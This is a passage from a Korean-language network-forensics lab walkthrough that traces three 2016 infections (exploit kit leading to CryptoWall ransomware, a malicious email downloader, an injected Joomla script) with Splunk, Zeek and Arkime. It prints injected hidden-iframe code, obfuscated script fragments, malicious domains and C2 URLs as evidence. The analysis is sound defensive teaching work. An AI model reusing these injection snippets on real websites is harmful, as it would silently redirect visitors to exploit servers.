    document.write('<style>.ecwrjvwhyzyjnx{position:absolute;top:-605px;width:300px;height:300px;}</style>
      <div class="ecwrjvwhyzyjnx"><iframe src="http://uacltr.securetopc.top/1993/10/14/madness/willow/dick-sort-southward-swallow.html"
      width="250" height="250"></iframe></div>');
    ```

    - **250×250 iframe을 페이지 위쪽 605 px 바깥에** 둬요. 사용자에게는 안 보이고, 브라우저는 자동으로 불러와요.
    - iframe 주소가 22:10:15의 랜딩 주소와 **정확히 같아요**.
    - 7일짜리 쿠키 두 개(`PHP_SESSION_PHP=120`, `_PHP_SESSION_PHP=123`) — **[추측]** 같은 방문자를 두 번 공격하지 않으려는 표시예요.

**스크립트가 실행됐다는 증거 — 쿠키 (Arkime):** 다음 koeppl 요청들을 열고 `Cookie:` 줄을 봐요.

```text
22:10:10.863  GET /                                              (Cookie 없음)
22:10:13.326  GET /cache/template/gzip.php?widgetkit-…css        Cookie: PHP_SESSION_PHP=120; _PHP_SESSION_PHP=123
22:10:14.120  GET /cache/template/gzip.php?bootstrap-…css        Cookie: PHP_SESSION_PHP=120; _PHP_SESSION_PHP=123
```

- **[데이터]** 캡처의 어떤 응답에도 `Set-Cookie: PHP_SESSION_PHP`가 없어요. 쿠키는 **브라우저 안에서**, 심긴 스크립트가 만들었어요.
- 기억할 방법: **"코드가 실행됐다면 남겨야 할 흔적"을 먼저 정하고, 그 흔적을 다음 요청에서 찾아요.** 5단계에서도 같은 방법을 써요.

### 3-3. 익스플로잇 킷과 페이로드 — 파일 (Splunk + Arkime) { #pc-a-files }

```spl
index=zeek sourcetype=zeek:files pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS tx_hosts="89.38.144.75"
| eval t=strftime(ts,"%H:%M:%S")
| table t tx_hosts rx_hosts mime_type seen_bytes md5
```

- `zeek:files` = Zeek이 트래픽에서 본 파일마다 한 줄이에요. `tx_hosts` = 보낸 쪽, `rx_hosts` = 받은 쪽, `mime_type` = **내용으로** 판단한 형식, `md5` = 지문이에요.
- `89.38.144.75` = 두 `securetopc.top` 이름의 서버예요(확인: `index=zeek sourcetype=zeek:dns query="*securetopc.top" | table ts query answers`).

**보여야 하는 결과:**

```text
t         tx_hosts      rx_hosts         mime_type                       seen_bytes  md5
22:10:15  89.38.144.75  192.168.122.132  text/html                       1035        946f2af6be0d796430b590ad5ee48be5
22:10:18  89.38.144.75  192.168.122.132  application/x-shockwave-flash   83229       6631e8c0d5f07004fabff81872f10d5e
22:10:27  89.38.144.75  192.168.122.132  (비어 있음)                     421888      dd5ecd6f928fc4f988996feb5b292879
```

이제 Arkime에서 페이로드를 열어요.

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.132 && http.uri == */officer/*
```

**[데이터] 결과 읽기:**

- 요청에 **Referer가 없고**, **User-Agent가 달라요**(IE 11에 `.NET CLR` 조각이 더 붙음). 헤더도 아주 적어요. 브라우저 페이지가 아니라 프로그램이에요.
- 응답은 `Content-Type: application/octet-stream`이고, 본문이 `26 2e c8 75 …`로 시작해요. **`MZ`가 아니에요.** 페이로드가 전송 중에는 **암호화**돼 있고 PC에서 풀어요.
- 그래서 이 MD5는 **암호화된** 바이트의 지문이에요. 디스크의 프로그램과 달라서, 악성코드 DB에서 찾아도 보통 안 나와요.

**[추측] 어떤 익스플로잇 킷인가?** 날짜와 아무 단어로 만든 경로, `.html.swf` 이름, 무작위 하위 이름 둘을 가진 `.top` 도메인, 단어 + 숫자 + 단어로 된 페이로드 경로, 암호화된 페이로드는 2016년 1월의 **Neutrino EK** 모습과 맞아요. "EK (Neutrino와 패턴이 맞음)"으로 적고, 확정된 이름으로 적지 않아요.

### 3-4. 페이로드 다음: 체크인 (Splunk + Arkime) { #pc-a-post }

```spl
index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.132 method=POST host IN ("bizsouls.com","estudiobarco.com.ar")
| eval host=mvdedup(host)
| eval t=strftime(ts,"%H:%M:%S")
| table t id_orig_p id_resp_h host uri request_body_len response_body_len
```

```text
t         id_orig_p  id_resp_h        host                 uri                             request_body_len  response_body_len
22:10:47  49218      188.138.101.154  bizsouls.com         /XG3vxT.php?y=21657wkalasvbb    131               14
22:10:51  49219      188.138.101.154  bizsouls.com         /XG3vxT.php?c=a2py731nhw        113               123668
22:11:11  49220      188.138.101.154  bizsouls.com         /XG3vxT.php?o=py8nr3ezh06q03o   124               0
22:12:14  …          50.22.11.55      estudiobarco.com.ar  /5TFv7E.php?z=py8nr3ezh06q03o   124               6
```

Arkime에서 POST 네 개를 열어요.

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.132 && host.http == [bizsouls.com, estudiobarco.com.ar]
```

```text
POST /XG3vxT.php?y=21657wkalasvbb HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; ...)
Host: bizsouls.com
Content-Length: 131
Connection: Close
Cache-Control: no-cache

b=31793872756d7071786e3391b3073aac2a423df8a3b5afb9cb38c907fba895a77d264b81ad...
```

**[데이터] 결과 읽기:**

- **브라우저가 아니에요:** `Accept-Language`, `Accept-Encoding`, Referer가 없어요. `Connection: Close`이고 **POST마다 새 연결**이에요(출발 포트 49218, 49219, 49220).
- 본문 = **한 글자 `=` hex**, 응답도 hex예요(`39187820a48aa9`. 두 번째 응답은 **hex 123,668바이트**). hex를 풀어도, 1바이트 XOR를 해도 읽을 수 없어요 → **[추측] 진짜 암호화**예요. 여기서 풀기를 멈춰요.
- 파라미터 글자(`y`, `c`, `o`, `z`)는 바뀌지만 값은 반복돼요. 경로 이름(`XG3vxT.php`)과 공유 웹호스팅 `Server:` 헤더는 **해킹당한 웹사이트를 중계소로 쓴** 모습과 맞아요.

**마지막 두 본문을 왜 비교하나요?** bizsouls는 세 번째 POST(22:11:11)에 **0바이트**로 답했어요. 1분 뒤 같은 종류의 POST가 estudiobarco로 갔어요. 본문이 **같다면**:

1. 프로그램이 **같은 메시지를 다른 서버에 다시 보냈어요** → **C2 서버 목록**이 있어요. 하나만 막으면 끝나지 않아요.
2. 두 사이트가 **같은 감염**에 속해요 — 티켓 하나에 IOC 두 개.
3. 같은 내용을 넣으면 같은 결과가 나오는 암호화라서, hex 값 자체를 지표로 쓸 수 있어요.

**읽지 않고 비교하는 법:** Arkime의 **Body MD5s**(HTTP 칸)는 **요청과 응답 본문 모두**의 MD5예요. bizsouls 세 번째 세션에는 `4fd5e80b20ea9d39925155d9f8b2aa1d`가 있어요(응답이 비어 있으니 요청 본문 것이에요). estudiobarco 세션에는 `eb74f3bb…`(응답)와 **`4fd5e80b20ea9d39925155d9f8b2aa1d`**가 있어요. **[데이터] 본문이 같아요**(`o=79386f37…eacb6`, 124바이트). URI 값 `py8nr3ezh06q03o`도 같아요.

### 3-5. 사용자가 연 페이지 (Arkime) { #pc-a-ransom }

**왜 보나요?** 페이로드도 체크인도 암호화돼 있어요. PC A가 감염된 건 알지만 **무엇에, 어떤 피해인지**는 몰라요. 이 페이지는 사람에게 보여 주려고 만든 거라서 평문이에요. 네 가지 질문에 답해 줘요: 무슨 악성코드, 어떤 피해, 정말 이 PC인지, 사용자가 봤는지.

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && host.http == 3wzn5p2yiumh7akj.waytopaytosystem.com
```

!!! warning "Arkime 세션은 요청 하나가 아니라 TCP 연결 하나예요"
    세션이 **7개** 나오는데 "22:16:46의 GET"이라는 세션은 없어요. 브라우저는 연결 하나를 열어 두고(keep-alive) 요청을 여러 번 보내요. **Start Time**은 연결이 열린 시각이지 요청 시각이 아니에요. 요청은 **출발 포트**로 찾아요.

    | 요청 | 요청 시각 | 세션 (Src Port) |
    |---|---|---|
    | `GET /1f96s0p` | 22:16:46.032 | **49222** (Start 22:16:45) |
    | `GET /picture.php?k=1f96s0p&…` | 22:16:49.853 | **49228** |
    | `POST /1f96s0p` | 22:16:57.894 | **49226** (Start 22:16:48) |

    Info 칸의 URI 목록도 **시간 순서가 아니에요**.

두 세션을 **natural**과 **uncompress**로 열어요(페이지가 gzip + chunked예요).

**① 세션 49222 — 첫 GET:**

```text
<title>Decrypt service</title>
Service to decrypt the files.
To continue please enter the code from the picture in the input field.
<img src="picture.php?k=1f96s0p&2fb0d914316c5ee97f49d0a673412155">
Code of picture: [5글자]   [Enter to decrypt service]
```

- 언어 국기(US, IT, FR, ES, DE)가 있는 **캡차** 페이지예요. 많은 `flags/*.png` 요청이 이것 때문이에요.
- 스크립트가 `tor2web-header`라는 요소를 숨겨요. **[추측]** tor2web은 일반 브라우저로 Tor 숨은 사이트에 들어가게 해 주는 중계예요. `3wzn5p2yiumh7akj`는 2016년 `.onion` 이름처럼 16글자예요. 진짜 서버는 Tor 안에 있어서 이 IP를 막아도 사라지지 않아요.

**② 세션 49226 — POST** (`es.png`, `rb.png`, `favicon.ico`를 지나 아래로 내려요)**:**

```text
POST /1f96s0p HTTP/1.1
Content-Length: 14

pic_code=T7z5W
```

```text
Your files are encrypted.
To get the key to decrypt files you have to pay 500 USD. If payment is not made before 14/01/16 - 16:16
the cost of decrypting files will increase 2 times and will be 1000 USD/EUR
Your system: Windows 7 (x64)   First connect IP: 103.12.9.206  [AU 국기]
We are present a special software - CryptoWall Decrypter - ...
Send 1.14 BTC to Bitcoin address: 16VXHKKtwGx8YG9qaEqszCLscUxtm326LZ
Your payments not found.
```

페이지 스크립트는 `back_timer('back_timer', 604800)`로 시작해요. 604,800초 = **7일**이에요.

**[데이터] 답:**

| 질문 | 답 |
|---|---|
| 무슨 악성코드? | **CryptoWall** — 페이지가 "CryptoWall Decrypter"라고 밝혀요 |
| 어떤 피해? | **파일 암호화**, 500 USD(1.14 BTC), 7일 뒤 두 배. 아직 결제 없음("Your payments not found") |
| 이 PC인가? | "Windows 7 (x64)"가 User-Agent `Windows NT 6.1; WOW64`와 맞아요. **[추측]** `103.12.9.206`은 이 네트워크의 공인(NAT) IP로, 첫 체크인 때 기록된 값이에요. AU 국기는 `google.com.au`를 쓰는 PC와 맞아요 |
| 사용자가 봤나? | **예.** 캡차를 직접 입력했어요(`pic_code=T7z5W`). Referer 없이 들어왔으니 **[추측]** PC에 남은 랜섬 노트에서 주소를 봤어요 |

!!! note "서버의 `Date:`가 아니라 캡처 시각을 써요"
    22:16:48에 캡처된 응답의 `Date:` 헤더가 22:17:14예요. 서버 시계가 약 26초 틀렸어요. 보고서 시각은 `ts`(캡처 시각)를 써요.

**PC A 결론:**

- **[데이터]** 구글 결과 → 해킹된 koeppl.com → 숨은 iframe → EK 랜딩 → Flash → 암호화된 페이로드 → 새 `MSIE 7.0` 프로그램이 해킹된 사이트로 체크인(C2 목록) → 사용자가 CryptoWall 결제 페이지를 열고 캡차를 입력.
- **[추측]** 드라이브바이 다운로드예요. 사용자가 클릭한 건 구글 결과 하나뿐이에요. Hokaydoo-PC의 파일은 **CryptoWall**로 암호화됐고, 이 PC가 쓸 수 있는 공유 폴더도 영향을 받았을 수 있어요. 누가 돈을 내기 전에 대응팀에 알려요.

---

## 4단계 — PC B: 192.168.122.130 FULL-METAL-JACK { #pc-b }

### 4-1. 스크립트의 요청 { #pc-b-requests }

1단계에서 .130이 22:11:53부터 `MSIE 7.0`으로 요청 9개를 보낸 걸 봤어요. 펼쳐 봐요.

```spl
index=zeek sourcetype=zeek:http id_orig_h=192.168.122.130 user_agent="*MSIE 7.0*"
| eval time=strftime(ts, "%H:%M:%S.%3N")
| table time, id_resp_h, host, uri, referrer, status_code, resp_mime_types, response_body_len
| sort time
```

- 1줄: `user_agent="*MSIE 7.0*"` — `*`는 "앞뒤에 아무 글자나"예요.
- 2줄: `eval`로 새 필드를 만들어요. `ts`를 `22:11:53.882` 모양으로 바꿔요. `%3N` = 밀리초.
- 3줄: `table`은 이 필드들만 이 순서로 보여 줘요.

**보여야 하는 결과(긴 `id=`는 줄였어요):**

```text
time          id_resp_h       host                             uri                                 status  resp_mime_types        response_body_len
22:11:53.882  216.158.85.7    ma-wt.com.sa                     /counter/?id=5553…5E55&rnd=8742951  200                            0
22:11:55.525  174.36.186.235  dariostoka.com                   /counter/?id=5553…5E55&rnd=8742951  200                            0
22:11:57.453  184.168.173.1   freshanointingministries-sc.org  /counter/?id=5553…5E55&rnd=8742951  200                            0
22:11:58.285  216.158.85.7    ma-wt.com.sa                     /counter/?id=5553…5E55&rnd=8742952  200     application/x-dosexec  260613
22:12:04.091  174.36.186.235  dariostoka.com                   /counter/?id=5553…5E55&rnd=8742952  200     application/x-dosexec  260613
22:12:21.976  184.168.173.1   freshanointingministries-sc.org  /counter/?id=5553…5E55&rnd=8742952  200     application/x-dosexec  260619
22:12:30.633  216.158.85.7    ma-wt.com.sa                     /counter/?id=5553…5E55&rnd=8742953  200     application/x-dosexec  114688
22:12:34.317  174.36.186.235  dariostoka.com                   /counter/?id=5553…5E55&rnd=8742953  200     application/x-dosexec  114688
22:12:47.942  184.168.173.1   freshanointingministries-sc.org  /counter/?id=5553…5E55&rnd=8742953  200     application/x-dosexec  145922
```

**[데이터] 결과 읽기:**

- **9개 모두 `id=`가 같아요.** `rnd=`는 이름과 달리 무작위가 아니라 라운드마다 **1씩 올라가요**(…51, …52, …53). **[추측]** `id` = 누가 묻는지, `rnd` = "N번 파일을 줘".
- **`referrer` 필드가 아예 없어요.** Zeek은 빈 필드를 JSON에 적지 않아요. 그래서 **Referer가 없다**는 뜻이에요. 웹 페이지가 아니라 프로그램이에요.
- 라운드 1은 모두 **0바이트**, 라운드 2와 3은 **윈도우 프로그램**(`application/x-dosexec`)이에요.
- **라운드마다 같은 사이트 순서**이고, 첫 사이트에서 받았는데도 세 곳 모두에서 또 받아요. PC A의 C2(실패할 때만 다음 서버)와 달리, 이 스크립트는 **미러 목록**을 한 바퀴씩 돌아요. 전체가 **54초**에 끝났어요.

### 4-2. `id=` 풀기 (CyberChef) { #pc-b-id }

```text
55535C5E06160B0B0F014A0C05090D08100B0A241605070F17140507014A070B4A110F5E3C5E170503010901000D054A0B16035E17555E55505156555C5C5653525E55
```

- `0-9 A-F`만 있어요 → **hex**예요. 136글자 = 68바이트.
- hex로 풀면 읽을 수 없지만, 같은 바이트가 반복돼요(`4A`가 여러 번). 진짜 암호화는 이렇게 반복되기 어려워요. **1바이트 XOR**라면 같은 글자는 늘 같은 바이트가 돼요.

CyberChef: **From Hex** → **XOR Brute Force**(Key length **1**, Sample length **100**, Print key **켜기**). Crib에 `.co`를 넣으면 맞는 줄만 남아요.

```text
Key = 64: 178:brooke.hamilton@rackspace.co.uk:X:sagemedia.org:s1:1452188276:1
```

| 칸 | 값 | 뜻 |
|---|---|---|
| 2 | `brooke.hamilton@rackspace.co.uk` | **이메일 주소** [데이터] |
| 4 | `sagemedia.org` | 도메인 — **[추측]** 보낸 쪽이나 캠페인 표시 |
| 6 | `1452188276` | **Unix 시간** = 2016-01-07 **17:37:56** UTC (`| makeresults | eval t=strftime(1452188276,"%Y-%m-%d %H:%M:%S")`) |
| 1, 3, 5, 7 | `178`, `X`, `s1`, `1` | 알 수 없음 — **[추측]** 캠페인이나 버전 표시 |

**[추측] 왜 중요한가요:** 스크립트 안에 이메일 주소와, 실행 **4시간 반 전**의 시각이 들어 있어요. **메일용으로 미리 만든 파일**을 나중에 열었다는 흐름과 맞아요. 메일 자체는 HTTPS에 가려졌지만 "메일 첨부 파일"이라는 추측의 근거가 돼요. 메일 담당은 이 주소나 `sagemedia.org`로 다른 받는 사람을 찾을 수 있어요. 사용자 본인의 주소인지는 알 수 없어요(사용자는 Yahoo Mail을 썼어요).

### 4-3. 다운로드: 프로그램인 "GIF" 파일 (Splunk + Arkime) { #pc-b-downloads }

```spl
index=zeek sourcetype=zeek:files rx_hosts="192.168.122.130" mime_type="application/x-dosexec"
| eval time=strftime(ts, "%H:%M:%S.%3N")
| table time, tx_hosts, filename, seen_bytes, md5, sha256
| sort time
```

```text
time          tx_hosts        filename              seen_bytes  md5
22:11:58.680  216.158.85.7    66b32.gif             260613      9f756e72eacc6b805481a49ce51c4a79
22:12:04.612  174.36.186.235  174125.gif            260613      9f756e72eacc6b805481a49ce51c4a79
22:12:22.606  184.168.173.1   c9a63078fe7d3741.gif  260619      d411bf37de7f72e98a62fc82917f50f7
22:12:31.277  216.158.85.7    250acae.gif           114688      e851eb249d2c38d56d1b496a3112cebc
22:12:35.088  174.36.186.235  d50f729942631.gif     114688      e851eb249d2c38d56d1b496a3112cebc
22:12:48.574  184.168.173.1   2487ff63fb4e79.gif    145922      92a4d0aeede3ce110b4121342df48496
```

같은 파일끼리 묶어요.

```spl
index=zeek sourcetype=zeek:files rx_hosts="192.168.122.130" mime_type="application/x-dosexec"
| stats count, values(tx_hosts) as servers, values(seen_bytes) as size by md5
```

- `stats … by md5` = 파일 지문마다 한 묶음. `values(tx_hosts) as servers` = 그 파일을 보낸 서버 목록.

**[데이터] 다운로드 6번, 서로 다른 EXE 4개.** ma-wt와 dariostoka는 같은 `rnd`에 **같은 파일**(같은 MD5)을 줬어요 — **[추측]** 파일 하나를 여러 해킹 사이트에 올려 둔 거예요. freshanointing은 다른 파일을 줬어요. 이름은 모두 **무작위 + `.gif`**이고, 같은 파일이어도 사이트마다 달라요.

SHA256 (호스트 팀용):

```text
95a9c8fccbe0e49dc132cf59d7ebf73e692da9f35491e0bfcac40b92c9022f5c  (260,613 B)
220a2e4f93d85f16dd74ed56247644e126b8d2d262374c4f09ec2be49cbcd0f3  (260,619 B)
306ab541cf4ace30c0f905ded4c26b40458c4dda28d9c5f00abd679ada6cf27d  (114,688 B)
227193160a2448dfa8bbbd2cf125afa9cca0d1a718b109a3adae5df8a24cdf6e  (145,922 B)
```

서버는 뭐라고 **말했을까요**? Arkime:

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.130 && http.uri == */counter/*
```

```text
HTTP/1.1 200 OK                                   ← 라운드 1 (rnd=…51)
Content-Type: text/html
Content-Encoding: gzip
Content-Length: 119                               ← gzip 119 B = 풀면 0 B

HTTP/1.1 200 OK                                   ← 라운드 2 (rnd=…52), 같은 연결
Content-Length: 260613
Content-Type: image/gif
Server: Microsoft-IIS/7.5
X-Powered-By: PHP/5.3.28
Content-Disposition: attachment; filename=66b32.gif

MZ…This program cannot be run in DOS mode…PE…text…data…rsrc
```

| | 서버가 말한 것 | 실제 내용 (Zeek) |
|---|---|---|
| 종류 | `image/gif` | `application/x-dosexec` |
| 이름 | `.gif` | 윈도우 EXE (`MZ`, `PE`, `.text`, `.rsrc`) |

**[추측]** 확장자나 `Content-Type`만 보는 필터를 피하려는 위장이에요. 이름표가 아니라 Zeek의 `mime_type`(내용 기준)을 믿어요. Arkime 세션 하나(포트 49220)에 라운드 1과 2가 **둘 다** 들어 있어요. 여기서도 keep-alive예요.

### 4-4. 스크립트 전: HTTPS 웹메일 { #pc-b-webmail }

메일은 HTTPS라 내용이 안 보여요. 그래도 **SNI**(암호화 전에 평문으로 보내는 서버 이름)로 어느 서비스를 언제 썼는지는 알 수 있어요.

```spl
index=zeek sourcetype=zeek:ssl id_orig_h=192.168.122.130
| stats min(ts) as first, max(ts) as last, count by server_name
| eval first=strftime(first, "%H:%M:%S.%3N"), last=strftime(last, "%H:%M:%S.%3N")
| sort first
```

- 2줄: SNI마다 한 줄: 첫 연결, 마지막 연결, 연결 수.
- 3줄: 두 시각을 `eval` 하나로 함께 바꿔요(쉼표로 구분).

```text
server_name                    first         last          count
www.bing.com                   22:06:35.382  22:06:59.726  11
login.live.com                 22:06:41.475  22:07:03.451  2
us-mg5.mail.yahoo.com          22:07:00.155  22:16:54.459  12
mail.yahoo.com                 22:07:01.903  22:07:37.178  2
login.yahoo.com                22:07:05.562  22:07:33.619  5
prodxobni.mail.yahoo.com       22:08:13.677  22:08:13.894  2
ws-contacts.progrss.yahoo.com  22:08:13.894  22:08:13.894  2
… (다른 *.yahoo.com, *.yimg.com)
```

**[데이터]** 빙 → 22:07에 **Yahoo Mail** 로그인. 메일 서버 `us-mg5`는 **22:16:54까지**, 즉 다운로드 **뒤에도** 계속돼요. 그래서 "마지막 메일 연결"로는 아직 아무것도 말할 수 없어요. `stats`는 12개 연결 중 처음과 마지막만 보여 줘요.

### 4-5. 웹메일 통신은 사용자일까, 페이지 자신일까 { #pc-b-rhythm }

```spl
index=zeek sourcetype=zeek:ssl id_orig_h=192.168.122.130 server_name="us-mg5.mail.yahoo.com"
| sort ts
| delta ts as gap
| eval time=strftime(ts, "%H:%M:%S.%3N"), gap=round(gap, 1)
| table time, id_orig_p, id_resp_h, gap
```

- 2줄은 **반드시** `delta`보다 먼저 와요. `delta`는 바로 **위** 줄과 비교하기 때문이에요.
- `delta ts as gap` = 이 줄의 `ts` − 앞 줄의 `ts` = 앞 연결과 몇 초 떨어졌는지.
- `round(gap, 1)` = 소수 첫째 자리.

```text
time          id_orig_p  gap
22:07:00.155  49174
22:08:33.335  49210      93.2
22:10:42.271  49216      128.9
22:10:42.274  49217      0.0
22:11:45.130  49219      62.9
22:11:47.467  49218      2.3
22:13:48.903  49227      121.4
22:13:49.157  49228      0.3
22:14:51.292  49230      62.1
22:14:54.025  49229      2.7
22:16:54.459  49231      120.4
22:16:54.459  49232      0.0
```

**[데이터] 규칙이 있어요:** 22:10:42부터 연결이 **두 개씩 짝**으로, 약 **2분 → 1분 → 2분 → 1분** 간격으로 열려요. 사람은 이렇게 시계처럼 클릭하지 않아요. **[추측]** Yahoo Mail 페이지가 새 메일을 **스스로** 확인하는 거예요. 첫 다운로드 6초 전의 22:11:45/47 짝도 이 박자 안에 있어서 **사용자 행동이 아니에요**. 실제 사용자 활동(로그인, 메일, 연락처)은 **22:08:47쯤** 끝나요.

!!! warning "함정: Arkime 그래프는 세션의 바이트를 **끝난 시각**에 놓아요"
    Arkime(`ip.src == 192.168.122.130 && port.dst == 443`, 그래프 **Data bytes** + **Bars**)에 **22:10:42에 1,650,773바이트**짜리 큰 막대가 있어요. 22:10:42에 큰 다운로드가 있었던 것처럼 보여요. 아니에요: 그때 열린 두 연결은 패킷이 9개, 6개뿐이에요. 그때 **끝난** 연결을 확인해요.

    ```spl
    index=zeek sourcetype=zeek:conn id_orig_h=192.168.122.130 id_resp_p=443
    | eval end=ts+duration
    | where end>=1452204641 AND end<1452204643
    | eval start=strftime(ts, "%H:%M:%S"), end=strftime(end, "%H:%M:%S.%3N")
    | table start, end, id_orig_p, id_resp_h, resp_bytes
    | addcoltotals resp_bytes
    ```

    - `end = ts + duration` = 연결이 닫힌 시각. `where`로 22:10:41–22:10:43만 남겨요. `addcoltotals`는 맨 아래에 합계 줄을 붙여요.
    - **[데이터] 연결 19개**가 22:06:59–22:08:47에 열렸고 모두 **22:10:41.8–22:10:42.9에 닫혔어요**. `resp_bytes` 합계 **1,646,923** ≈ Arkime 막대예요. 그래프는 세션의 바이트 전부를 **마지막 패킷** 시각에 놓아요(**Bounding: Last Packet** 설정). 실제 메일 데이터는 22:07–22:09에 오갔어요.

### 4-6. 다운로드 뒤에 새로운 것이 있나 { #pc-b-after }

22:11:53 이후 **처음** 나타난 목적지예요. 캡처 전체를 봐야 "전에 갔던 곳"인지 알 수 있어요.

```spl
index=zeek sourcetype=zeek:conn id_orig_h=192.168.122.130
| stats min(ts) as first_seen, count, sum(resp_bytes) as resp_bytes by id_resp_h, id_resp_p
| where first_seen>=1452204713
| eval first_seen=strftime(first_seen, "%H:%M:%S.%3N")
| sort first_seen
```

- 1줄에 시간 조건이 없는 건 일부러예요. 3줄은 **처음** 연결이 22:11:53(1452204713) 이후인 목적지만 남겨요. 숫자를 글자로 바꾸기(4줄) **전에** 비교해요.

```text
id_resp_h       id_resp_p  first_seen    count  resp_bytes
216.158.85.7    80         22:11:53.451  1      376115
174.36.186.235  80         22:11:55.008  3      376181
184.168.173.1   80         22:11:57.052  3      407337
```

그다음 마지막 다운로드 뒤의 모든 연결:

```spl
index=zeek sourcetype=zeek:conn id_orig_h=192.168.122.130 ts>1452204768
| eval time=strftime(ts, "%H:%M:%S.%3N")
| table time, id_resp_h, id_resp_p, service, conn_state, orig_bytes, resp_bytes
| sort time
```

**[데이터] 결과 읽기:**

- 새 목적지는 **다운로드 사이트 3곳뿐**이에요. ma-wt는 요청 3개를 **연결 1개**로 보냈어요(keep-alive).
- 22:12:48 이후: **연결 8개, 모두 443**이에요. `124.108.101.10`(us-mg5, **매번 2,019 / 1,499바이트로 같음** = 자동)과, 전에도 갔던 Yahoo IP 두 곳(0 / 0바이트)이에요. 마지막 둘은 `S1`(캡처가 끝날 때까지 열려 있음)이에요.
- **DNS 없음, HTTP 없음, 새 User-Agent 없음.**

**PC B 결론:**

- **[데이터]** Yahoo Mail을 쓰는 동안 스크립트(`MSIE 7.0`, Referer 없음)가 해킹된 웹사이트 3곳에서 GIF로 위장한 윈도우 프로그램 4종류(다운로드 6번)를 받았어요. 스크립트의 `id=`에는 이메일 주소와 4.5시간 전 시각이 들어 있어요.
- **[추측]** **메일 첨부 파일**(아마 `.js`)이에요. 언제 열었는지는 HTTPS 때문에 안 보여요. 남은 4분 동안 후속 통신이 없어요. EXE가 아직 실행되지 않았거나 나중에 연결할 수 있어요. **감염된 것으로 보고** 메일함과 PC를 확인해요.

---

## 5단계 — PC C: 192.168.122.52 Jennifer-PC { #pc-c }

### 5-1. 검색에서 게이트까지 { #pc-c-chain }

```spl
index=zeek sourcetype=zeek:http id_orig_h=192.168.122.52 ts>=1452204540 ts<1452204580
| eval time=strftime(ts, "%H:%M:%S.%3N")
| table time, host, uri, referrer, status_code, resp_mime_types, response_body_len
| sort time
```

- `ts>=`와 `ts<`를 함께 쓰면 시간 범위가 돼요: **22:09:00 – 22:09:40**.

**보여야 하는 결과(핵심 줄):**

```text
time          host                 uri                                    referrer                                                len
22:09:01.063  l.yimg.com           /pv/static/lib/srp-core-js-…js          http://au.search.yahoo.com/search?p=planetside.co.uk…  306566
22:09:05.759  ri.search.yahoo.com  /_ylt=…/RU=http://planetside.co.uk//…  http://au.search.yahoo.com/search?p=planetside.co.uk…  (302)
22:09:12.190  planetside.co.uk     /                                      http://au.search.yahoo.com/search?p=…                   23509
22:09:20.017  planetside.co.uk     /media/system/js/mootools-core.js      http://planetside.co.uk/                                99877
22:09:23.764  planetside.co.uk     /media/system/js/core.js               http://planetside.co.uk/                                4784
22:09:24.829  st.domandvilma.com   /fvviewforumqn.php                     http://planetside.co.uk/                                26
22:09:26.423  planetside.co.uk     /media/system/js/caption.js            http://planetside.co.uk/                                729
22:09:27.331  ajax.googleapis.com  /ajax/libs/jquery/1.11.3/jquery.min.js http://planetside.co.uk/                                95992
…             planetside.co.uk / ajax.aspnetcdn.com (스크립트와 스타일 더)
```

**[데이터] 결과 읽기:**

- 사용자가 **Yahoo에서 "planetside.co.uk"를 검색**하고 결과를 눌렀어요. `ri.search.yahoo.com`이 `RU=http://planetside.co.uk//`로 **302** 응답해요(Yahoo가 클릭을 기록하고 진짜 사이트로 보내요). PC A처럼 일부러 간 방문이에요.
- **22:09:24 — `st.domandvilma.com/fvviewforumqn.php`**, Referer = planetside 페이지예요. **응답이 26바이트뿐이에요.** EK 랜딩 페이지로는 너무 작아요(PC A는 1,035 B).
- 그 뒤는 planetside와 구글·마이크로소프트 CDN(`googleapis`, `aspnetcdn`)뿐이에요. `googleapis`의 404 두 개는 사이트의 옛 링크라 공격과 관계없어요.
- **Referer는 페이지를 알려 주지, 스크립트를 알려 주지 않아요.** 페이지의 모든 스크립트가 같은 Referer를 보내요. 시간으로 보면 후보는 `mootools-core.js`(4.8초 전)와 `core.js`(1.1초 전)예요. 내용을 읽어요.

### 5-2. 어느 파일이 게이트를 불렀나 (Arkime) { #pc-c-inject }

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.52 && http.uri == [planetside.co.uk/media/system/js/mootools-core.js, planetside.co.uk/media/system/js/core.js]
```

- `[a, b]` = 둘 중 아무거나. Arkime의 `http.uri`에는 도메인이 들어간다는 것을 기억해요.

**`core.js` — 깨끗해요.** 평범한 **Joomla** 코드예요(`Joomla.submitform`, `Joomla.checkAll` …). 다른 도메인을 부르는 코드가 없어요.

**`mootools-core.js` — 끝에 끼워 넣었어요.** MooTools는 유명한 공개 라이브러리이고, 공격자는 보통 파일의 **맨 앞이나 맨 끝**에 코드를 붙여요. 라이브러리의 마지막 줄(`…return eval(rs);}})();`) 바로 뒤에 무작위 주석 두 개 사이의 코드가 있어요.

```text
/* S4PoQHwRAGy */var jcvJp4p="\x75se\u0072\x69dA08\u00317FB25";var oD4RG9="30";
...
tdxwSOD.src="\x68ttp:\x2f/st.do\x6da\u006edvilm\x61.com\x2f"+j7aMn(2,6)+"v\u0069\x65wforum"+j7aMn(2,6)+"\u002ephp";
...
if(main_color_handle.length==0){xco56v_(jcvJp4p,oD4RG9,48);return;}
...
var FCPKqK="<iframe on\x6co\x61d=\u0027\x6d\u0045J\u0074\x51o(\x29;\u0027 src=\u0027"+mClKFF+"'\u0020w\x69dth=19 hei\u0067\x68\x74\x3d1\x39 \x66ramebor\u0064er=0 scroll\x69\u006eg=\u0027no\x27>\u003c/iframe>";
... /* DwRn2gPflETI4EP3B6B */
```

Ctrl+F로 `domandvilma`를 찾으면 **안 나와요**. 이름을 이스케이프 코드로 숨겼기 때문이에요. 이것도 단서예요.

